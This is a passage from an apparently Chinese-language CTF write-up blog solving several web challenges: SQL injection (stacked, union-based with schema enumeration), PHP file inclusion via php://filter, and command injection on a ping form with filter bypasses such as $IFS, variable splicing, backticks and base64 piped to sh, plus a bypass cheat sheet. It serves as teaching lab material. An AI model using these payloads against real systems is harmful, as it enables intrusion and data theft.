<p><img src="https://i.loli.net/2021/05/26/tfjuprceWOZNob5.png" alt="image-20210526144140604"></p>
<p><img src="https://i.loli.net/2021/05/26/y6vCzkpGKODMug9.png" alt="image-20210526144222011"></p>
<p>紧接着当然会是想要查表 Flag 中的字段内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> Flag;#		#查不到</span><br></pre></td></tr></table></figure>

<p>这时因为Flag已经被过滤掉了，可以找个脚本跑一下，看看都被过滤了什么</p>
<p><img src="https://i.loli.net/2021/05/26/jtyXMeL3m9GizN2.png" alt="image-20210526165510881"></p>
<p>这些都是被过滤掉的，可以发现 <code>* 和 || </code>  并没有被过滤</p>
<p>网上求解：貌似有说存在源码泄露的 <code>index.php.swp</code> ，其中包含一条查询代码 <code> $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile</span></span><br><span class="line"><span class="string">        			|readfile|where|from|union|update|delete|if|sleep|extractvalue|</span></span><br><span class="line"><span class="string">    			    updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">&#123;$BlackList&#125;</span>/is&quot;</span>,<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post[&#x27;query&#x27;];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nonono.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Too long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select &quot;</span>.<span class="variable">$post</span>[<span class="string">&#x27;query&#x27;</span>].<span class="string">&quot;||flag from Flag&quot;</span>;</span><br><span class="line">        mysqli_multi_query(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> = mysqli_store_result(<span class="variable">$MysqlLink</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$res</span>))&#123;</span><br><span class="line">                    print_r(<span class="variable">$row</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result(<span class="variable">$MysqlLink</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地环境测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> email_id               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb<span class="variable">@dhakkan</span>.com       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angel<span class="variable">@iloveu</span>.com       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy<span class="variable">@dhakkan</span>.<span class="keyword">local</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman<span class="variable">@dhakkan</span>.<span class="keyword">local</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin<span class="variable">@dhakkan</span>.com      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="operator">*</span> <span class="keyword">from</span> emails;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;* from emails&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+---+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> email_id               <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+---+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb<span class="variable">@dhakkan</span>.com       <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angel<span class="variable">@iloveu</span>.com       <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy<span class="variable">@dhakkan</span>.<span class="keyword">local</span>    <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman<span class="variable">@dhakkan</span>.<span class="keyword">local</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin<span class="variable">@dhakkan</span>.com      <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+---+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span><span class="operator">|</span><span class="number">1</span> <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+-----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> email_id               <span class="operator">|</span> <span class="number">1</span><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+-----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb<span class="variable">@dhakkan</span>.com       <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angel<span class="variable">@iloveu</span>.com       <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy<span class="variable">@dhakkan</span>.<span class="keyword">local</span>    <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman<span class="variable">@dhakkan</span>.<span class="keyword">local</span> <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin<span class="variable">@dhakkan</span>.com      <span class="operator">|</span>   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+-----+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>,<span class="number">1</span><span class="operator">|</span>email_id <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> email_id               <span class="operator">|</span> <span class="number">1</span><span class="operator">|</span>email_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb<span class="variable">@dhakkan</span>.com       <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angel<span class="variable">@iloveu</span>.com       <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy<span class="variable">@dhakkan</span>.<span class="keyword">local</span>    <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> secure<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> stupid<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> superman<span class="variable">@dhakkan</span>.<span class="keyword">local</span> <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7</span> <span class="operator">|</span> batman<span class="variable">@dhakkan</span>.<span class="keyword">local</span>   <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span> admin<span class="variable">@dhakkan</span>.com      <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------+------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">8</span> warnings (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span>email_id <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span><span class="operator">||</span>email_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>构造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*,1			<span class="comment">#即语句为	$sql = &quot;select *,1||flag from Flag&quot;;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/X5Nu1xdOMGTv83p.png" alt="image-20210526172614026"></p>
<p><a href="https://blog.csdn.net/weixin_44037296/article/details/105190639?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">参考链接</a></p>
<h1 id="六、-ACTF2020-新生赛-Include1"><a href="#六、-ACTF2020-新生赛-Include1" class="headerlink" title="六、[ACTF2020 新生赛]Include1"></a>六、[ACTF2020 新生赛]Include1</h1><p><strong>考点：文件包含、php 伪协议</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/JasXvUIgtizdf3G.png" alt="image-20210526173617412"></p>
<p>然后 base64 解码即可</p>
<p>尝试 <code>php://input</code> ，被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="七、-极客大挑战-2019-Secret-File1"><a href="#七、-极客大挑战-2019-Secret-File1" class="headerlink" title="七、[极客大挑战 2019]Secret File1"></a>七、[极客大挑战 2019]Secret File1</h1><p><strong>考点：文件包含、源码泄露、php 伪协议</strong></p>
<p>查看源代码或者是抓包可获取到 <code>Archive_room.php</code> 文件，访问</p>
<p><img src="https://i.loli.net/2021/05/26/xJzKljUAO4d6EG1.png" alt="image-20210526175532372"></p>
<p>点击按钮再抓包，得到私密文件 <code>secr3t.php</code></p>
<p>访问得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>过滤掉了 <code>tp、input、data</code></p>
<p>使用 <code>php:filter//</code> 伪协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strstr ( <span class="keyword">string</span> <span class="variable">$haystack</span> , <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">bool</span> <span class="variable">$before_needle</span> = <span class="literal">false</span> ) : <span class="keyword">string</span></span><br><span class="line"><span class="comment">#返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。 </span></span><br><span class="line"><span class="comment">#该函数区分大小写。如果想要不区分大小写，请使用 stristr()。 </span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">stristr() 函数搜索字符串在另一字符串中的第一次出现。</span><br><span class="line">查找 <span class="string">&quot;world&quot;</span> 在 <span class="string">&quot;Hello world!&quot;</span> 中的第一次出现，并返回字符串的剩余部分：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> stristr(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;WORLD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#返回：world!</span></span><br></pre></td></tr></table></figure>

<h1 id="八、-极客大挑战-2019-LoveSQL1"><a href="#八、-极客大挑战-2019-LoveSQL1" class="headerlink" title="八、[极客大挑战 2019]LoveSQL1"></a>八、[极客大挑战 2019]LoveSQL1</h1><p><strong>考点：SQL 注入 之 联合查询、报错注入</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3#			#数据库 geek</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;geek&#x27;</span>)#			#获取到表 geekuser,l0ve1ysq1</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema = &#x27;</span>geek<span class="string">&#x27; and table_name = &#x27;</span>l0ve1ysq1<span class="string">&#x27;)#				#获取到字段 id,username,password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),(<span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)) <span class="keyword">from</span> geek.l0ve1ysq1)#				#获取到 flag</span><br></pre></td></tr></table></figure>

<h1 id="九、-ACTF2020-新生赛-Exec1"><a href="#九、-ACTF2020-新生赛-Exec1" class="headerlink" title="九、[ACTF2020 新生赛]Exec1"></a>九、[ACTF2020 新生赛]Exec1</h1><p><strong>考点：命令执行、||、|、&amp;、&amp;&amp;</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|whoami					<span class="comment">#www-data</span></span><br><span class="line">|<span class="built_in">pwd</span>					<span class="comment">#/var/www/html</span></span><br><span class="line">|ls						<span class="comment">#index.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|ls/					<span class="comment">#根目录下</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/zFx53JISfmi2e9H.png" alt="image-20210526183433414"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|cat /flag				<span class="comment">#得到 flag</span></span><br></pre></td></tr></table></figure>

<h1 id="十、-GXYCTF2019-Ping-Ping-Ping1"><a href="#十、-GXYCTF2019-Ping-Ping-Ping1" class="headerlink" title="十、[GXYCTF2019]Ping Ping Ping1"></a>十、[GXYCTF2019]Ping Ping Ping1</h1><p><strong>考点：命令执行、空格、分隔符、变量覆盖、</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|<span class="built_in">pwd</span>				<span class="comment">#/var/www/html</span></span><br><span class="line">|ls					<span class="comment">#flag.php	index.php</span></span><br><span class="line">|cat flag.php		<span class="comment">#fxck your space!</span></span><br><span class="line">|ls /				<span class="comment">#1fxck your symbol!</span></span><br><span class="line">|cat$IFS<span class="variable">$1flag</span>.php	<span class="comment">#fxck your flag!  flag也被过滤</span></span><br><span class="line">|cat$IFS<span class="variable">$1index</span>.php	<span class="comment">#内容如下</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>找到过过滤规则，构造</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#变量覆盖</span></span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla<span class="variable">$a</span>.php</span><br><span class="line"><span class="comment">#内联执行  将反引号内命令的输出作为输入去执行</span></span><br><span class="line">?ip=127.0.0.1;cat$IFS<span class="variable">$1</span>`ls`;</span><br><span class="line"><span class="comment">#sh 命令执行</span></span><br><span class="line">?ip=127.0.0.1;<span class="built_in">echo</span>$IFS<span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64$IFS<span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/05/26/ldsmJGRHq6OtChi.png" alt="image-20210526190805874"></p>
<p><strong>总结：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#空格绕过</span></span><br><span class="line"><span class="comment">#Linux下</span></span><br><span class="line">1.  <span class="variable">$&#123;IFS&#125;</span>替换</span><br><span class="line">2.	$IFS<span class="variable">$1</span>替换</span><br><span class="line">3.	<span class="variable">$&#123;IFS替换</span></span><br><span class="line"><span class="variable">4.	%20替换</span></span><br><span class="line"><span class="variable">5.	&lt;和&lt;&gt;重定向符替换</span></span><br><span class="line"><span class="variable">6.	%09替换(需要php环境)</span></span><br><span class="line"><span class="variable">#Windows下</span></span><br><span class="line"><span class="variable">1.  type.\flag.txt</span></span><br><span class="line"><span class="variable">2.  type,flag.txt</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">#cat绕过 常使用 tac</span></span><br><span class="line"><span class="variable">(1)more:一页一页的显示档案内容</span></span><br><span class="line"><span class="variable">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span></span><br><span class="line"><span class="variable">(3)head:查看头几行</span></span><br><span class="line"><span class="variable">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span></span><br><span class="line"><span class="variable">(5)tail:查看尾几行</span></span><br><span class="line"><span class="variable">(6)nl：显示的时候，顺便输出行号</span></span><br><span class="line"><span class="variable">(7)od:以二进制的方式读取档案内容</span></span><br><span class="line"><span class="variable">(8)vi:一种编辑器，这个也可以查看</span></span><br><span class="line"><span class="variable">(9)vim:一种编辑器，这个也可以查看</span></span><br><span class="line"><span class="variable">(10)sort:可以查看</span></span><br><span class="line"><span class="variable">(11)uniq:可以查看</span></span><br><span class="line"><span class="variable">(12)file -f:报错出具体内容</span></span><br><span class="line"><span class="variable">(13)sed:一种编辑器，这个也可以查看</span></span><br><span class="line"><span class="variable">(14)grep</span></span><br><span class="line"><span class="variable">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file </span></span><br><span class="line"><span class="variable">(15)strings</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">#变量绕过</span></span><br><span class="line"><span class="variable">a=c;b=at;c=fl;d=ag;$a$b $c$d</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">#base64 编码绕过</span></span><br><span class="line"><span class="variable">echo &#x27;cat&#x27; | base64</span></span><br><span class="line"><span class="variable">echo &#x27;Y2F0Cg==&#x27; | base64 -d test.txt</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">#内联执行  将反引号内命令的输出作为输入去执行</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">#bash、sh命令 		# Y2F0IGZsYWcucGhw 内容是 cat flag.php</span></span><br><span class="line"><span 